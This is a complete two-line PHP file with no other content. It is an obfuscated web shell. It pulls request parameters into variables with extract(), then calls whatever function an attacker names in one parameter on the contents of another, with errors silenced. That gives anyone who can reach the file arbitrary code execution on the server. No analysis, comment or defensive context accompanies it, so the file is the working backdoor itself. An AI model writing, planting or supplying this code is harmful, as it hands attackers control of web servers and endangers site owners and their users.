<?php
extract($_REQUEST) && @$lock(stripslashes($accept)) && exit;